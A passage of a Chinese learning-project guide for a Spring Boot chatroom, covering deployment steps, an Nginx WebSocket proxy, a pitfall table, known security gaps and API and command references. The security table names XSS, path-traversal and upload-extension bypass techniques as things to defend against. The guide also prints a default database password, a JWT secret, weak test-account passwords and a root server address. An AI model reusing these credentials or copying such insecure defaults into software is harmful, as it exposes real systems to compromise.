|---|---|---|
| 1 | 点输入框 | 页面**不会突然放大**（iOS 对 < 16px 的输入框会自动缩放） |
| 2 | 点进一个会话 | 整屏滑入，且左上角有 `‹` 返回 |
| 3 | 长按自己的气泡 | 弹出「撤回」，且**不弹**系统选字菜单 |
| 4 | 按手机系统返回键 | 回到会话列表（不是退出页面） |

#### ✅ 阶段 7 通过标准

上面全过 = **项目成功上线**。

### 15.8 附录 · 端口为什么是 8082

**背景**：这台实例是用某个 AI 模板创建的，模板自带一个游戏服务：

```
/usr/bin/java -jar /opt/ghbang_game_server/ghbang_game_server-1.0.0.jar
```

**它同时占着 8080 和 8081**，而且**两种常规办法都干不掉它**：

1. `systemctl stop ghbang_game_service` → `Unit ... not loaded`（systemd 已经不认它）
2. `kill -9 <pid>` → **30 秒后 `ss` 显示还是同一个 pid、还在 LISTEN**

即"**systemd 管不着，`kill` 又杀不掉**"。继续深挖需要 `nsenter` 进命名空间、或卸载模板应用 —— 投入产出比太低。

**处理方式：不跟它纠缠，改用 `8082`。**

> `SERVER_PORT` 是 Spring Boot 的内置配置键，而**环境变量优先级高于所有配置文件** ——
> 所以换端口只要改 `chatroom.env` 一行，**不用改 yml、不用重新打包**。

**🔴 三条硬教训（比结论值钱）：**

**① 部署时遇到"环境遗留物"，给它设一个时间盒（比如 2 轮），超了就绕开。**

> 主链路跑通后你手里有个能用的系统，回头收拾它是"可选项"；
> 而卡在它上面，**主链路永远是零**。

**② `Unit not found` 要先怀疑拼写，再怀疑服务不存在。**

本机踩过：从 `cgroup` 路径里看到 `/system.slice/ghbang_game_server.service`，照着抄成 `ghbang_game_server` → 四条 `systemctl` 命令**全部失败**。

**真实名字是 `ghbang_game_service`（service），不是 `game_server`。**

**抄错的症状（`Unit not found`）和"服务真的不存在"一模一样，极难区分。**

反查真实名字：

```bash
systemctl list-units --all --no-pager | grep -i <关键字>
systemctl list-unit-files  --no-pager | grep -i <关键字>
# 或直接 Tab 补全：systemctl stop gh<Tab>
```

**③ 🔴 别把 pid 写死。**

`ss` 的输出是**瞬时快照**。实测 `ss` 显示占用者是 pid `455678`，半小时后 `ps -p 455678` 只剩表头、`/proc/455678` 直接 `No such file or directory`。

**"认人"和"动手"必须用同一条命令串起来做：**

```bash
PID=$(ss -lntp | grep ':8082' | grep -oP 'pid=\K[0-9]+' | head -1)
```

**④ 判断"服务会不会被自动拉起"，看 `journalctl` 里的 `Scheduled restart job`。**

那是 systemd 自己记的账，比任何推断都可靠：

```
ghbang_game_service.service: Main process exited, code=KILLED, status=9/KILL
ghbang_game_service.service: Scheduled restart job, restart counter is at 3.
ghbang_game_service.service: Started ghbang game service - ghbang Game Server.
```

**光看 `ss` + `ps` 只能看到"pid 变了"，看不到"为什么变"。**

> 另外：**只要输出里出现 `tencent` / `cloudmonitor` / `barad` / `tat_agent` / `stargate` / `orca` / `sgagent` 任何一个，就别杀** ——
> 那些是云厂商的监控 / 终端代理，**杀了可能导致网页终端或监控失联**。

### 15.9 附录 · 增量部署（改了代码之后怎么更新）

**改完代码要重新上线，就是下面三步。不要每次从头走阶段 1–5。**

#### 第 1 步 · 你在 Windows 上打包

🔴 **两个必踩的坑：**

**① `mvn` 不在 PATH 上。** 必须写全路径：

```bash
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B clean package -DskipTests
```

（照抄 `mvn -o -B clean package` 会得到 `'mvn' 不是内部或外部命令`。）

**② 必须先 `cd /d` 到项目目录。** cmd.exe 默认开在 `C:\Users\a`，在那儿跑 `scp target/xxx.jar` 一定报 `No such file or directory`。

```bash
cd /d E:\JavaEE-learn\web-chatroom\chatroom
```

#### 第 2 步 · 上传 + 重启 + 自检（一条命令搞定）

```bash
scp target/web-chatroom-0.0.1-SNAPSHOT.jar root@101.42.2.204:/opt/chatroom/app.jar
```

```bash
ssh root@101.42.2.204 "md5sum /opt/chatroom/app.jar; systemctl restart chatroom; sleep 6; systemctl status chatroom --no-pager | head -8; echo '--- 静态资源 ---'; curl -s http://127.0.0.1:8082/css/client.css | wc -c"
```

#### 第 3 步 · 看三个数字判断成没成

| 看什么 | 期望 | 说明 |
|---|---|---|
| `md5sum` | 与本地 `md5sum target/...jar` 一致 | 不一致 = 上传损坏，重传 |
| `Active:` | `active (running)` | 起不来就 `journalctl -u chatroom -n 50` |
| `client.css` 字节数 | 和本地文件一致 | 🔴 **这是最有价值的一条检查** |

**🔴 为什么值得单独 curl 一下 CSS？**

`scp` 成功 ≠ 改动生效。

`curl` 是把文件**从服务器取回来量长度** —— 字节数和本地一致，才算真的上线了，而不是"我以为传上去了"。

**改前端时这个数字会变**，所以每次改完 CSS/HTML 都值得看一眼。

#### 🔴 关于「先备份再部署」——顺序很重要

```bash
# ❌ 错的顺序：scp 已经把 app.jar 覆盖了，这时 cp 出来的 .bak 其实是新包
scp target/xxx.jar root@...:/opt/chatroom/app.jar
ssh root@... "cp /opt/chatroom/app.jar /opt/chatroom/app.jar.bak && systemctl restart chatroom"

# ✅ 对的顺序：在 scp 之前先备份
ssh root@101.42.2.204 "cp /opt/chatroom/app.jar /opt/chatroom/app.jar.bak"
scp target/web-chatroom-0.0.1-SNAPSHOT.jar root@101.42.2.204:/opt/chatroom/app.jar
ssh root@101.42.2.204 "systemctl restart chatroom"
```

**回滚：**

```bash
ssh root@101.42.2.204 "cp /opt/chatroom/app.jar.bak /opt/chatroom/app.jar && systemctl restart chatroom"
```

> 本项目实际风险很低：`systemctl restart` 起来的是标准 Spring Boot 应用，真起不来也可以直接改源码重新打包，不必非留 `.bak`。
> **但如果要备份，就一定要在 `scp` 之前备份** —— 事后补是没用的。

**改了表结构：** 先 `scp` 对应的 `db_migrate_*.sql`，用 root 跑一遍，再重启应用。

**改了前端（html/css/js）：** 前端是**打进 jar 的**，所以也要重新打包 + 重启，**不能只传文件**。

### 15.10 阶段 8 ·（可选）Nginx 反代 + HTTPS

**什么时候才需要**：想要一个不带端口号的地址、想上 HTTPS（`ws://` → `wss://`）、或者以后要在同一台机器上跑第二个服务。

```bash
dnf install -y nginx
systemctl enable --now nginx
```

先在 `/etc/nginx/nginx.conf` 的 **`http { }` 块里**（不是 `server` 里）加：

```nginx
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}
```

这是官方推荐的 WebSocket 升级写法，比在 `location` 里写死 `Connection "upgrade"` 更稳（非 WS 的普通请求不会被误标）。

`/etc/nginx/conf.d/chatroom.conf`：

```nginx
server {
    listen 80;
    server_name 你的域名或公网IP;

    client_max_body_size 10m;          # 与后端 multipart max-request-size 10MB 对齐

    location / {
        proxy_pass http://127.0.0.1:8082;
        proxy_http_version 1.1;         # WebSocket 必须 1.1，默认是 1.0

        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        proxy_set_header Upgrade    $http_upgrade;      # ↓ 两个头缺一不可
        proxy_set_header Connection $connection_upgrade;

        proxy_read_timeout 3600s;       # WS 是长连接，别被默认 60s 掐掉
        proxy_send_timeout 3600s;
    }
}
```

```bash
nginx -t && systemctl reload nginx
```

#### 🔴 最常见的误判

**`Upgrade` / `Connection` 这两个头少任何一个，症状都是「页面能打开、消息发不出去」。**

浏览器 `new WebSocket()` 会成功返回对象，但 Nginx 没把请求升级成 WS，后端拿不到 `Upgrade` 头就不切协议，连接立刻被关。

**这个症状极容易被误判成"后端 WS 代码坏了"—— 其实后端一行都不用改。**

**`proxy_read_timeout` 默认只有 60s**，而 WebSocket 是"连着不动"的长连接。项目里 `client.js` 每 25s 发一次心跳正好能续上（**这是加心跳时的一个意外收益**），但把超时调大才是双保险。

#### 上 HTTPS（等有域名再说）

- 有域名 → certbot 或腾讯云免费证书，配 443 + 证书路径，再把 80 重定向到 443
- ✅ **代码不用改** —— `client.js` 的 `buildWsUrl()` 已经写成
  `location.protocol === 'https:' ? 'wss://' : 'ws://'` 并用 `location.host` 拼地址

---

## 第 16 章 · 踩坑总清单（速查表）

按"坑出在哪一层"分类。**每一条都有明确症状** —— 照着症状搜，能直接定位。

### 16.1 依赖与构建

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 1 | MyBatis-Plus starter 用了 `mybatis-plus-boot-starter` | 启动报 `NoClassDefFoundError` / 各种诡异的自动配置失败 | Spring Boot 3 必须用 **`mybatis-plus-spring-boot3-starter`** |
| 2 | jjwt 只引了 `jjwt-api` | 运行期 `Unable to load class DefaultJwtBuilder` | **三个包都要引**：`jjwt-api` + `jjwt-impl` + `jjwt-jackson` |
| 3 | `mvn` 不在 PATH | `'mvn' 不是内部或外部命令` | 用 IntelliJ 内置 Maven 的全路径 |
| 4 | cmd 没 `cd` 到项目目录 | `No such file or directory` | `cd /d E:\...\chatroom` |
| 5 | 打包漏了 `spring-boot-maven-plugin` 的 `repackage` | jar 只有几十 KB，`java -jar` 报 `no main manifest attribute` | pom 里要有 `spring-boot-maven-plugin` |

### 16.2 数据库与 MyBatis-Plus

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 6 | 实体没标 `@TableId` | insert 后主键是 null（注册返回 `userId: null`），**唯一线索是启动日志一行 WARN** | `@TableId(type = IdType.AUTO)` |
| 7 | 列名写成驼峰 | `Unknown column 'userId' in 'field list'` | 全蛇形（`map-underscore-to-camel-case` 默认 true） |
| 8 | 拿一个 Mapper 操作别的表 | **编译期就挂** | 每张表配自己的 Mapper |
| 9 | 用 MP 的 insert 做"存在就跳过" | `DuplicateKeyException` 把事务带崩 | MP 没有 `insert ignore` → 手写 `@Insert` |
| 10 | `@JsonInclude(NON_NULL)` 挂在表实体上 | join 出来的 `fromUserName` 前端读到 `undefined` | 表实体与返回体**拆两个类** |
| 11 | 按时间取"最新一条"没加主键兜底 | 结果**不确定**（同一条 SQL 两次执行给出不同行） | `order by post_time desc, message_id desc` |
| 12 | 给带 `@AllArgsConstructor` 的类加字段 | **编译期**大面积报错 | 加之前先 grep `new XxxEntity(` |
| 13 | 密码列宽不够 | `pwd_len` 不是 64（密文被截断） | `varchar(64)`（32 位 MD5 + 32 位盐） |
| 14 | MySQL 8 密码不合策略 | **`1045 Access denied`（真因是被忽略的 `1819`）** | 密码要含特殊字符、不能含用户名 |
| 15 | `caching_sha2_password` + `useSSL=false` | **`Communications link failure`**（真因是 `Public Key Retrieval is not allowed`） | JDBC URL 加 `allowPublicKeyRetrieval=true` |

### 16.3 异常与 HTTP 语义

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 16 | 业务异常只塞 body `code:400`，HTTP 仍是 200 | jQuery 走 `success` 不走 `error` → **前端 alert 分支永不执行**（用户觉得"点了没反应"） | 用 `ResponseEntity.status(...)` 返回**真状态码** |
| 17 | 前端 error 分支不读后端 message | 「用户名或密码错误」被盖成笼统的「请求参数有误」 | 加 `if (xhr.responseJSON?.message)` 优先显示 |
| 18 | `@ExceptionHandler(Exception.class)` 吃掉协议级异常 | 405 / 400 / 415 全变成 **500「服务器内部错误」** | 单列一条 handler 枚举类型，用 `ErrorResponse.getStatusCode()` |
| 19 | `MaxUploadSizeExceededException` 没单独处理 | 上传超大文件报 **500** | 单独返 **413** |
| 20 | `WebConfig` 没排除 `/error` | 异常转发被再拦一次，**401 盖掉真实错误** | 排除清单里必须含 `/error` |

### 16.4 鉴权与安全

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 21 | 从请求参数取当前用户 id | 前端改个 id 就能**冒充别人** | 只从 `request.getAttribute(CURRENT_USER_ID)` 取 |
| 22 | `acceptFriend` 不校验申请存在 | **单方面加好友**，绕过整条权限链 | 校验申请确实存在 |
| 23 | `createGroup` 不校验 `isFriend` | 能把**陌生人**拉进群，看到全部历史消息 | 校验"只能拉自己的好友" |
| 24 | 🔴 把 `isFriend` 加到 `sendMessage` | **群成员不一定是好友** → 群里发不出消息 | `sendMessage` 校验的是 `isMember` |
| 25 | `findCommonSession` 漏了 `ms.type = 1` | 点好友发起私聊，**结果进了群聊** | where 里加 `ms.type = 1` |
| 26 | 图片消息 content 不校验前缀 | `javascript:` / 外链注入 → **隐私追踪像素** | 必须以 `/upload/` 开头 |
| 27 | 用用户的原始文件名 | **目录穿越**（`../../`）/ 上传可执行脚本 | 文件名服务端生成 |
| 28 | 扩展名用黑名单 | 永远漏（`.phtml` / `.PHP` / `.php.` / `.php::$DATA`） | 用**白名单** |
| 29 | 渲染用户内容不转义 | **XSS**：`<img onerror>` 偷 token | `escapeHtml`（`createTextNode` + `innerHTML`） |

### 16.5 WebSocket

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 30 | 用 JSR-356 的 `@ServerEndpoint` | 处理器里 `@Autowired` **全是 null** | 用 Spring 原生（`WebSocketConfigurer` + `TextWebSocketHandler`） |
| 31 | `WebConfig` 没放行 `/ws/**` | 握手被判 **401** | 放行 `/ws/**` |
| 32 | 想给 WS 加自定义请求头 | 做不到 —— **浏览器原生 WebSocket 不支持** | token 挂 URL query |
| 33 | 广播漏掉发送者自己 | **"只有对方看得见"**（前端不做本地回显） | 广播给会话内**所有**成员（含自己） |
| 34 | 事务里直接推 | **幽灵消息**：对方刷新发现没有这条 | `TxAfterCommit` |
| 35 | `setDefaultMaxSessionIdleTimeout` 不生效 | 值设进去了、**连接不关**（SB3 + 内嵌 Tomcat 静默失效） | 自研 `WebSocketIdleReaper` |
| 36 | 在线表用 `Map<userId, session>` 一对一 | **多标签页互相踢** | `Map<userId, Set<session>>` |
| 37 | WS 业务异常直接断连 | 用户体验差，且没法说明原因 | 回 `type: "error"` 推送 |
| 38 | 前端 `initWebSocket()` 不幂等 | **发一条消息，界面出现两条** | 加 `readyState` 检查 |

### 16.6 业务逻辑

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 39 | 未读游标用 `post_time` | 同秒消息**顺序不确定** | 用自增 `message_id` |
| 40 | 更新游标不带前进守卫 | 慢请求后到 → **已读位置倒退**，读完的又变未读 | `and last_read_message_id < #{id}` |
| 41 | 前端自己 +1 算未读 | 刷新 / 撤回 / 多标签页时算错 | **后端给权威值** |
| 42 | 撤回用物理 delete | 界面上留不下痕迹，且**查不到原发布时间**（没法验超时） | 软删除 `revoked` |
| 43 | 撤回只做读校验 | 两个标签页同时点 → **双双通过** → 重复撤回 | UPDATE 再带三个条件（第二道闸） |
| 44 | 搜索权限用 where 过滤 | 要么全表扫，要么一个 `or` 写错就是**全站泄露** | 权限条件写 **join 的 on 里** |
| 45 | 会话列表 `other` 用 inner join | 群里只剩我一人时，**这个群整行查不出来** | 必须 `left join` |
| 46 | 会话列表聚合用 `HashMap` | **顺序被打乱**（不按最近聊天排） | 用 `LinkedHashMap` |
| 47 | 群聊 join 出 N-1 行没聚合 | 一个群在列表里出现 N-1 次 | `computeIfAbsent` 聚合 + `friendId` 判空 |
| 48 | 撤回后未读数减 1 | 和微信不一致 | **有意不减**（SQL 不加 `and revoked = 0`） |
| 49 | 撤回的消息原文下发 | 前端能拿到已撤回内容 | `case when revoked = 1 then null` |

### 16.7 部署

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 50 | 用 `sudo -u` 不带 `-E` | 程序照样起来，**悄悄用回 dev profile + 仓库默认密码** | `sudo -E -u chatroom` |
| 51 | env 文件里含 `&` 的值不加引号 | 变量**被拆成 3 条后台任务**，等于没设（只有一行 `[2]+ Done` 提示） | 用单引号包起来 |
| 52 | 用 `--spring.config.additional-location=xxx.env` | `Unrecognized file extension` 启动即退 | 用 shell `source`，不用这个参数 |
| 53 | 忘了换 `JWT_SECRET` | **谁都能伪造任意用户的 token** | `openssl rand -base64 48` 生成新的 |
| 54 | systemd 少 `SuccessExitStatus=143` | 正常 `stop` 显示 **`failed`** | 143 = 128+15 = SIGTERM |
| 55 | `mysqld` 没 `enable` | 服务器重启后应用能起，但**任何请求都连库失败** | 两个服务一起 `is-enabled` 确认 |
| 56 | 只放行了 8082 没放行 22 | **能开网页终端、`scp` 却超时** | 网页终端走内部通道，不经 22 |
| 57 | 点了腾讯云「一键放通」 | **3306 MySQL 暴露公网**（本机无 firewalld，等于裸奔） | 用「自定义」规则只开需要的端口 |
| 58 | 备份顺序错了（先 scp 再 cp） | `.bak` 其实是**新包**，回滚无效 | **必须在 scp 之前备份** |
| 59 | 以为"网页终端正常 = SSH 正常" | 同上第 56 条 | 从公网 `curl` 一遍才算数 |
| 60 | 手工抄 pid | **pid 已过期** | 认人和动手用**同一条命令**串起来 |
| 61 | 照 cgroup 路径抄 systemd 单元名 | `Unit not found`（和"服务真不存在"**症状一样**） | 用 `systemctl list-units \| grep` 反查 |
| 62 | 在"环境遗留物"上耗太久 | 主链路永远是零 | **给时间盒，超了就绕开** |

### 16.8 前端

| # | 坑 | 症状 | 解法 |
|---|---|---|---|
| 63 | FormData 上传时手动指定 `contentType` | jQuery 覆盖 `$.ajaxSetup` 的 `User-Token` → **只有上传接口 401** | `contentType: false` |
| 64 | 靠 `new Date("2026-09-24 21:17:03")` 解析 | **Safari 返回 `Invalid Date`** → 撤回按钮永远不显示 | 手工拆字段 + `new Date(y, m-1, d, ...)` |
| 65 | 月份忘了 `-1` | 所有时间**偏一个月** | JS 的月份从 0 开始 |
| 66 | `initWebSocket()` 多入口调用 | 开出多条连接 → 消息重复显示 | 加 `readyState` 判断（同 #38） |
| 67 | 更新游标后没清红点 | 点开会话红点还在 | 打开会话时先调 `/sessionRead` |

---

## 第 17 章 · 已知不足与下一步

这一章是**主动写的**。原因很实在：

> 面试被问到"你这个项目还有什么问题"时，**能主动说出来，比被面试官指出好得多**。
> 主动说 = 你知道边界在哪；被指出 = 你不知道。

### 17.1 安全问题（按危险程度排）

#### 🔴 ① `/upload/**` 和 `/avatar/**` 无鉴权

**现状**：任何人拿到图片 URL，就能永久访问这张图，不需要登录。

**为什么会这样**：因为它们在 `WebConfig` 里被放行了 —— 而放行是**被迫的**，浏览器 `<img src>` 带不了自定义请求头。

**正确解法**：签名 URL。

```
GET /upload/chat/4_9f2c1a3b5d7e.png?expires=1735689600&sign=a1b2c3d4...
```

服务端用密钥对"路径 + 过期时间"做签名。这样：
- URL 泄露了也只在有效期内能用
- 签名校验不需要请求头（签名在 query 里）

**代价**：需要一个统一的"URL 生成"入口（不能让前端自己拼），且所有 `<img src>` 的生成逻辑都要改。

**当前缓解**：文件名是 `ownerId + 12 位随机串`，**不可枚举** —— 攻击者猜不到 URL。这算"安全性靠隐蔽性"，**不算真正的安全**，但比"用自增 id 当文件名"好得多。

#### 🔴 ② MD5 加盐挡不住 GPU 离线爆破

**现状**：`密文 = md5(密码 + 盐) + 盐`。

**为什么不够**：MD5 的设计目标是"快"，一块现代 GPU 每秒能算**上百亿次** MD5。

加了每用户随机盐之后，"彩虹表"这条路被堵死了（同一个密码在不同用户那里密文不同），**但"针对单个用户的暴力破解"依然很快** —— 一个 8 位小写字母密码，几小时就能跑完。

**正确解法**：换成 **BCrypt**（或 Argon2 / scrypt）。

| | MD5 + 盐 | BCrypt |
|---|---|---|
| 设计目标 | **快** | **慢**（这是特性！） |
| 单次耗时 | 微秒级 | **几十~几百毫秒**（可配 cost） |
| 抗 GPU | 极弱 | 强（内存密集 + 可调成本因子） |
| 换算法的代价 | — | **现有密码全部作废**（需要用户重设密码，或做"登录时渐进式迁移"） |

> **渐进式迁移**是个挺漂亮的方案：用户下次登录时，用旧算法验证通过 → 顺手用 BCrypt 重新加密存回去。
> 这样老用户无感，活跃用户会自动迁移到新算法。面试里说出来是个加分项。

#### 🟡 ③ 没有接口限流

**现状**：一个登录用户每秒能发几千条消息。

**后果**：
- 刷屏骚扰
- `message` 表被写爆
- WebSocket 广播放大（一条消息 → 广播给 N 个成员 → N 倍流量）

**正确解法**：
- 单用户消息频率限制（比如 10 条/秒，用令牌桶）
- 登录接口失败次数限制（防爆破）
- 上传接口频率限制（防磁盘写满）

#### 🟡 ④ JWT 无法主动失效

**现状**：签出去的 token 在过期前一直有效，**服务端没法"注销"它**。

**后果**：用户点了"退出登录"其实只是前端删了 localStorage 里的 token；有人偷到 token 也**没法封禁**。

**正确解法**（三选一）：

| 方案 | 优点 | 缺点 |
|---|---|---|
| 短有效期（如 15 分钟）+ Refresh Token | 泄露窗口小 | 要维护刷新逻辑 |
| Redis 存黑名单 | 能主动失效 | 引入 Redis 依赖 |
| 服务端存 session | 完全可控 | 退回有状态，JWT 的意义就没了 |

> 本项目选了"不过期"。这是个**刻意的取舍** —— 对学习项目来说，最重要的是先把主链路跑通，而不是把所有安全机制都堆上。
> **但面试时必须知道这是个问题。**

#### 🟡 ⑤ 测试账号是弱密码

`wangwu` / `xiaodudu` 的密码都是 `123456`。

**正式对外前必须删掉。**

### 17.2 功能不足

| # | 不足 | 影响 | 解法 |
|---|---|---|---|
| 1 | 历史消息**无分页** | 一个聊了几万条的会话，一打开就全量返回 → 页面卡死 | 游标分页 `where message_id < #{lastId} order by message_id desc limit 20`，前端上滑加载更多 |
| 2 | 搜索结果**无分页**且**无高亮** | 命中 1000 条时全返回；且看不出关键词在哪 | 同上分页；高亮用前端的 `String.replace` 包 `<mark>`（**注意要转义后再高亮，顺序不能反**）|
| 3 | **没有消息已送达 / 已读回执** | 发完不知道对方看没看 | 已读回执复用现成的已读游标 —— 对方读到时推一条 `type: "read"` 给发送者 |
| 4 | **没有表情** | 课件附录提了"图片-表情" | 表情本质是一组约定好的短码（`:smile:` → 一张图），前端替换即可，**后端零改动** |
| 5 | **没有消息通知** | 页面在后台时不知道有新消息 | Web Notification API（要用户授权）；或标题栏闪烁 |
| 6 | **不能清空 / 删除会话** | 会话列表越用越长 | 软删除 —— 加 `message_session_user.deleted` 字段，查询时过滤 |
| 7 | **群聊不能改群名 / 移出成员** | 只能建群、加人、退群 | 加"群主"概念（`message_session.owner_id`）后才有权限模型 |
| 8 | **在线状态不显示** | 不知道对方在不在 | `OnlineUserManager` 已有数据，加一个 `GET /onlineStatus?userId=` 即可 |

### 17.3 工程化不足

| # | 不足 | 说明 |
|---|---|---|
| 1 | **没有单元测试** | `src/test` 是空的。至少该有：`Md5Util`（加盐/验证）、`JwtUtil`（生成/解析）、撤回的时间窗口边界、未读游标的"前进守卫"逻辑（**这条最适合写测试，因为它是纯逻辑且有明确边界**） |
| 2 | **没有接口文档** | 21 个接口全靠 `client.js` 反推。该上 Swagger / springdoc-openapi |
| 3 | **日志没有结构化** | 多实例部署时没法聚合。该上 JSON 格式日志 |
| 4 | **没有监控** | 不知道 QPS、错误率、内存占用。该上 Actuator + Prometheus |
| 5 | **没有 CI/CD** | 全靠手工 `scp`。该上 GitHub Actions / Jenkins |
| 6 | **没有容器化** | 该写 Dockerfile，把"环境依赖"这件事标准化 |

### 17.4 🔴 `application.yml` 里还留着默认值

这是**上线前必改**的一条，单独立一节。

**现状**：

```yaml
spring:
  datasource:
    username: ${DB_USERNAME:root}
    password: ${DB_PASSWORD:118523}      # ← 仓库里公开的默认值
jwt:
  secret: ${JWT_SECRET:+JEq/o2bYDEtaECkxKCeAt0i3yA0IPUlV2rxFVGS+v4=}
```

**问题**：如果哪天忘了注入环境变量（或者 `sudo` 少了 `-E`，见 15.4），应用会**拿着一串公开在代码仓库里的弱密码悄悄跑起来**。

**正确做法**：把默认值删掉。

```yaml
spring:
  datasource:
    username: ${DB_USERNAME}      # 没有默认值
    password: ${DB_PASSWORD}
jwt:
  secret: ${JWT_SECRET}
```

**这样忘了注入环境变量，应用会直接启动失败并明确报错：**

```
Could not resolve placeholder 'DB_PASSWORD' in value "${DB_PASSWORD}"
```

**这就是"快速失败（fail fast）优于带默认值继续跑"的典型场景** —— 也是能直接写进面试回答的一句话：

> **"配置项宁可让它启动失败，也不要给一个默认值。**
> **带默认值继续跑，等于把你的失败推迟到'用户发现登录不上'的那一刻，而且失败现场离原因很远。"**

### 17.5 下一步的优先级建议

按"投入产出比"排：

| 优先级 | 事项 | 理由 |
|---|---|---|
| 🔴 P0 | 删掉 `application.yml` 里的默认值 | 一行改动，消除最大的"静默失败"风险 |
| 🔴 P0 | 换 BCrypt | 安全性的硬伤，且改动集中在 `Md5Util` + 一处调用 |
| 🟡 P1 | 历史消息分页 | 唯一一个"用户会真实感受到"的功能缺陷 |
| 🟡 P1 | 补单元测试（先测撤回窗口 + 未读游标） | 这两个是纯逻辑、边界清晰、最容易写也最容易出 bug |
| 🟢 P2 | 接口文档（springdoc-openapi） | 21 个接口没文档，维护成本已经开始显现 |
| 🟢 P2 | 消息已读回执 | 复用现成游标，成本低、体验提升明显 |
| ⚪ P3 | Nginx + HTTPS / 容器化 / CI | 属于"从个人项目走向工程"的范畴 |

---

## 附录 A · 21 个接口清单

**路径风格约定**（很重要，写新接口前先看一眼）：

- **user 模块带 `/user` 前缀**，其余模块**全部平铺无前缀**
- **写操作大多走 `POST`，但参数挂在 URL query 上**（不是 body，所以**别写 `@RequestBody`**）
- 只有 `POST /user/login` 和 `POST /user/register` 用 `@RequestBody` 收 JSON

| # | 方法 | 路径 | 参数 | 返回 | 说明 |
|---|---|---|---|---|---|
| 1 | POST | `/user/login` | JSON body | `{userId, token}` | 登录 |
| 2 | POST | `/user/register` | JSON body | `{userId, userName}` | 注册 |
| 3 | GET | `/user/userInfo` | — | `{userId, userName, avatar}` | 当前用户信息 |
| 4 | POST | `/user/avatar` | multipart `file` | `{avatar}` | 换头像 |
| 5 | GET | `/avatar/{userId}` | 路径变量 | 图片 / 404 | 读头像（**无需登录**） |
| 6 | GET | `/friendList` | — | `[{userId, userName}]` | 好友列表 |
| 7 | GET | `/findFriend` | `keyword` | `[{userId, userName}]` | 模糊查人 |
| 8 | GET | `/addFriend` | `toUserId`, `reason` | — | 发好友申请 |
| 9 | GET | `/getFriendRequest` | — | `[{fromUserId, fromUserName, reason}]` | 待处理的申请 |
| 10 | GET | `/acceptFriend` | `fromUserId` | — | 通过申请 |
| 11 | GET | `/rejectFriend` | `fromUserId` | — | 拒绝申请 |
| 12 | GET | `/sessionList` | — | `[SessionListResponse]` | 会话列表（含未读数） |
| 13 | POST | `/session` | `toUserId` | `{sessionId}` | 创建/复用单聊会话 |
| 14 | GET | `/sessionRead` | `sessionId` | — | 标记会话已读 |
| 15 | POST | `/group` | `name`, `memberIds`（可重复） | `{sessionId}` | 建群 |
| 16 | POST | `/groupMember` | `sessionId`, `newMemberId` | — | 往群里加人 |
| 17 | POST | `/quitGroup` | `sessionId` | — | 退群 |
| 18 | GET | `/message` | `sessionId` | `[MessageResponse]` | 历史消息 |
| 19 | GET | `/revokeMessage` | `messageId` | — | 撤回消息 |
| 20 | GET | `/searchMessage` | `keyword` | `[MessageSearchResponse]` | 搜索消息 |
| 21 | POST | `/message/image` | multipart `file` | `{url}` | 上传聊天图片 |
| — | **WS** | `/ws/message?token=xxx` | — | — | **WebSocket 端点**（收发 + 推送） |

**WebSocket 推送的 7 种 `type`：**

| type | 触发时机 | 关键字段 |
|---|---|---|
| `message` | 有人发消息 | `messageId` / `fromId` / `fromName` / `sessionId` / `content` / `contentType` / `postTime` / `unreadCount`（**只给非发送者**） |
| `addFriendRequest` | 有人加你好友 | `fromUserId` / `fromUserName` / `reason` |
| `acceptFriend` | 你的申请被通过 | `fromUserName` |
| `revoke` | 有人撤回消息 | `messageId` / `sessionId` / `fromId` / `fromName` |
| `groupCreated` | 你被拉进群 | `groupName`（**不带 sessionId**，前端收到重新拉一次列表） |
| `pong` | 心跳应答 | 无 |
| `error` | 你的 WS 请求没处理成功 | `content`（当错误文案用） |

**客户端发给服务端的 2 种 `type`：**

| type | 含义 |
|---|---|
| `message` | 发消息（`sessionId` / `content` / `contentType`） |
| `ping` | 心跳（无业务含义，服务端回 `pong`） |

---

## 附录 B · 常用命令速查

### B.1 本地开发

```bash
# 打包（mvn 不在 PATH，必须全路径）
cd /d E:\JavaEE-learn\web-chatroom\chatroom
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B clean package -DskipTests

# 编译（快速检查语法）
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B compile

# 本地起服务（指定端口，避免被注入的 SERVER_PORT 影响）
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B spring-boot:run -Dspring-boot.run.arguments=--server.port=18080

# 看 jar 里的 application.yml（确认没有 log-impl）
unzip -p target/web-chatroom-0.0.1-SNAPSHOT.jar BOOT-INF/classes/application.yml | grep -n 'log-impl'

# 算本地 jar 的 md5（和服务器对一下）
md5sum target/web-chatroom-0.0.1-SNAPSHOT.jar
```

### B.2 服务器运维

```bash
# ===== 状态 =====
systemctl status chatroom --no-pager        # 应用状态
systemctl status mysqld --no-pager          # 数据库状态
systemctl is-enabled mysqld chatroom        # 开机自启（两个都要 enabled）

# ===== 启停 =====
systemctl restart chatroom                  # 重启（换 jar / 改 env 之后）
systemctl stop chatroom                     # 停止
systemctl start chatroom                    # 启动

# ===== 日志 =====
journalctl -u chatroom -f                   # 实时跟随（Ctrl+C 只退出查看，不停服务）
journalctl -u chatroom -n 100 --no-pager    # 最近 100 行
journalctl -u chatroom --since "10 min ago" # 最近 10 分钟
grep -a -m1 'profile is active' /opt/chatroom/logs/chatroom.log   # 确认 profile（-a 防 GBK 被当二进制）

# ===== 自检 =====
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/login.html   # 期望 200
curl -s http://127.0.0.1:8082/css/client.css | wc -c                        # 期望 = 本地字节数
ss -lntp | grep 8082                        # 谁在监听 8082
ps -o pid,ppid,tty,sid,cmd -p $(systemctl show -p MainPID --value chatroom) # 验 TTY=? PPID=1

# ===== 上传目录 / 日志文件 =====
